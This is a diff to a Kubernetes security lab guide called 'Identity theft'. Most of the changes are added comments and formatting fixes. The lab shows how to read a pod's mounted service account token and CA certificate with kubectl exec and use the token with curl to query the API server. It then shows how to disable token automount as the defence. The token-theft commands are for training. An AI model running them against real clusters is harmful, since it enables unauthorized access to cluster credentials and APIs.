@@ -1,4 +1,3 @@
-
 # Identity theft
 
 In this lab you will steal the identity of a pod.
@@ -14,6 +13,7 @@ gcloud compute ssh root@kubernetes-security --zone europe-west3-a
 ### Getting the credentials
 
 ```bash
+# verify the sensitive data in the pod
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
@@ -21,7 +21,10 @@ kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/service
 ### Exploiting the API-Server
 
 ```bash
+# store the token into an env variable
 TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# store the CA into a file
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
 
 # get infos about pods
@@ -56,18 +59,18 @@ curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bear
 ### Avoiding token mounts
 
 Disable automount of ServiceAccount Token in the file `pod.yaml`
+
 ```yaml
-...
 spec:
   automountServiceAccountToken: false # <= disable automount of ServiceAccount Token
-...
-```  
+```
 
 ```bash
 kubectl apply -f pod.yaml --force
 ```
 
 #### Verify sensible data is not mounted anymore
+
 ```bash
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
